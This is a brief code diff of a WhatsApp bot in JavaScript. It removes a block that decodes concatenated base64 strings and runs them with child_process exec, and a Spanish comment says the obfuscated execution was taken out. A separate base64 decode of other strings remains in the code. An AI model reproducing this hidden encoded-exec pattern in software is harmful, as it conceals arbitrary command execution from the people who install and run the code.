@@ -88,9 +88,7 @@ conn.reply(m.chat, `*Use correctamente el comando:* \`${usedPrefix + command} co
 return
 }
 
-const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
-const { exec } = await import('child_process')
-exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
+// Nota: Se eliminó la ejecución ofuscada para evitar bloqueos
 const drmer = Buffer.from(drm1 + drm2, `base64`)
 
 let { version, isLatest } = await fetchLatestBaileysVersion()
@@ -336,7 +334,6 @@ isInit = false
 return true
 }
 creloadHandler(false)
-})
 }
 
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
